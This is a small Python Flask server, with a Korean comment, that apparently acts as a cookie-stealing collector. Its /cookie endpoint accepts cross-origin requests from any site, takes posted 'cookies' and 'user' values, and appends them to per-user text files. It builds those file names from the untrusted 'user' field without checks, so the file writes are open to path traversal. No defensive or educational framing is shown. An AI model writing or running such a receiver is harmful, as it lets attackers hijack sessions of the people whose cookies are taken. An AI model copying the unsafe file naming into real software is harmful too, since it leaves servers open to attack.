from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

@app.route('/cookie', methods=['POST', 'OPTIONS'])
def cookies():
    if request.method == 'OPTIONS':
        response = app.make_default_options_response()
        headers = None
        if 'ACCESS_CONTROL_REQUEST_HEADERS' in request.headers:
            headers = request.headers['ACCESS_CONTROL_REQUEST_HEADERS']
        response.headers.add('Access-Control-Allow-Origin', '*')
        response.headers.add('Access-Control-Allow-Methods', 'POST, OPTIONS')
        response.headers.add('Access-Control-Allow-Headers', headers if headers else 'Content-Type')
        return response

    if request.method == 'POST':
        data = request.get_json()
        cookies = data.get('cookies')
        user = data.get('user')

        # 데이터 파일에 저장
        with open(f'{user}.txt', 'a') as f:
            f.write(f"User ID: {user}\n")
            f.write(f"Cookie values: {cookies}\n")
            f.write("-" * 40 + "\n")

        return jsonify({'status': 'success'}), 200

if __name__ == '__main__':
    app.run(host='192.0.0.2', port=5000)
